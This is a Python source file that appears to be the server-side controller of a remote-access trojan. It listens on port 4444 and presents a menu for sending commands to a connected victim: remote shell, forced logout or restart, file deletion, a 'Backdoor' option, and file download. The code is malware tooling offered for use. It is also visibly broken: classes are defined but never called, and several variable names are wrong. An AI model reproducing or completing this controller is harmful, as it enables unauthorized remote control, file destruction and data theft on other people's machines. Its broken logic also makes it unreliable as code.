from socket import *

s = socket(2,1)
s.bind(("127.0.0.1",4444))
s.listen(1)
print("Connected To Port")
print("______________________________\n")


client, addr = s.accept()
print("Connected To"+str(addr)+"\n")
print("______________________________")

   
data = input('''
    1-shell
    2-Log Out         
       1.2-Log out 10s           
       2.2-Restart 10s
       3.2-Cansel
    3-Delete File
    4-Backdoor
    5-File Download           
Enter your choice:''')

if data == "1":
    
    class Shell:
         def __init__(self):
              self.command =" "
              client.send((data).encode())                
         def get_cmd(self):
             self.Command = input("shell=>  ")
             client.send((Command).encode())
             new_data = client.recv(102456).decode()
             print(new_data)
             
                    


elif data == "2":
    class Logout:
        def __init__(self):
            self.command = " "
            client.send(data.encode())
            
    
elif data == "1.2":
    class Logoutsecund(Logout):
        
        def __init__(self):
            self.command = " "
            client.send(data.encode())

elif data == "2.2":
    class Restart(Logout):
        def __init__(self):
            self.command = " "
            client.send(data.encode())
    
elif data == "3.2":
    class Cansel(Logout):
        def __init__(self):
            self.command = " "
            client.send(data.encode())    

elif data == "3":
    class Delete:
        def __init__(self):
            self.command = " "
            
        def get_cmd(self):    
            self.F = open("Delete_File Result.txt", "w")
            self.File = input("Enter Your File_Name(Example File.txt): ")
            client.send((data+self.File).encode())
            new_data = client.recv(1024).decode()
            F.write(new_data)
            F.close()



elif data == "4":
    class Backdoor:
        def __init__(self):
            self.command = " "
            
        def get_cmd(self): 
            self.F = open("Backdoor Result.txt", "w")
            client.send((data).encode())
            new_data = client.recv(1024).decode()
            F.write(new_data)
            F.close()


elif data == "5":
    class Download:
        def __init__(self):
            self.command = " "
            client.send(data.encode())    
    

        
        
        
    
    
    
